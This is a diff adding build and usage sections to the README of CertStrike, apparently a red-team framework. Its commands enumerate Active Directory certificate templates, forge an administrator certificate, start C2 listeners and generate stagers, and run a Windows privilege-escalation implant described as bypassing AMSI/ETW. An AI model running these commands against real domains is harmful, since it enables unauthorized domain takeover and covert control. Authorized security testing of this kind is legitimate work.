@@ -27,6 +27,126 @@ CertStrike is a robust, all-in-one exploitation framework specifically targeting
 
 ## Building
 
+### Using Make (Recommended)
+
 ```bash
-go build -o certstrike cmd/certstrike/main.go
+# Build main CLI
+make build
+
+# Build SmartPotato implant
+make smartpotato
+
+# Run tests
+make test
+
+# Cross-compile for all platforms
+make cross-compile
+
+# Build everything and run tests
+make all
 ```
+
+### Manual Build
+
+```bash
+go build -o certstrike ./cmd/certstrike
+go build -o implants/smartpotato/smartpotato ./implants/smartpotato
+```
+
+## Usage
+
+### PKI/Certificate Attacks
+
+```bash
+# Enumerate ADCS templates
+certstrike pki --target-dc dc01.corp.local --domain corp.local --username user --password pass --enum
+
+# Forge a golden certificate
+certstrike pki --forge --upn administrator@corp.local --ca-key ca-key.pem --output admin-cert.pem
+```
+
+### Mobile Extraction
+
+```bash
+# ClearBrite forensic extraction
+certstrike mobile --device-id emulator-5554 --extract --output-dir ./extraction
+
+# Zero-click simulation
+certstrike mobile --zero-click --target-ip 192.168.1.100 --payload-type pegasus
+```
+
+### C2 Operations
+
+```bash
+# Start HTTP listener
+certstrike c2 --bind 0.0.0.0 --port 8080 --protocol http
+
+# Start HTTPS listener with certs
+certstrike c2 --bind 0.0.0.0 --port 8443 --protocol https --cert server.crt --key server.key
+
+# Generate stager configuration
+certstrike c2 --generate-stager --output stager.json
+```
+
+### SmartPotato Implant
+
+```bash
+# Run with auto-detection
+./smartpotato auto
+
+# Specific technique
+./smartpotato juicy
+./smartpotato rogue
+```
+
+## Development
+
+### Project Structure
+
+```
+certstrike/
+├── cmd/certstrike/          # CLI entry point and subcommands
+│   ├── main.go              # Root cobra command
+│   ├── pki.go               # PKI subcommand
+│   ├── mobile.go            # Mobile subcommand
+│   └── c2.go                # C2 subcommand
+├── pkg/
+│   ├── pki/                 # PKI/ADCS implementation
+│   │   ├── adcs.go          # Template enumeration, cert forging
+│   │   └── adcs_test.go
+│   ├── mobile/              # Mobile device ops
+│   │   ├── clearbrite.go    # ADB extraction, zero-click sim
+│   │   └── clearbrite_test.go
+│   └── c2/                  # C2 server
+│       ├── listener.go      # HTTP/HTTPS listener, session mgmt
+│       └── listener_test.go
+├── implants/
+│   └── smartpotato/         # Windows privilege escalation implant
+│       └── main.go          # RC4 decrypt, AMSI/ETW bypass, potato techniques
+├── scripts/                 # Build and test automation
+│   ├── build.sh
+│   └── test.sh
+├── Makefile                 # Build targets
+└── .gitignore
+```
+
+### Running Tests
+
+```bash
+# Run all tests
+go test ./...
+
+# Run with coverage
+go test -cover ./...
+
+# Generate coverage report
+./scripts/test.sh
+```
+
+## Security Notice
+
+This tool is designed for authorized security testing and research only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
+
+## License
+
+MIT
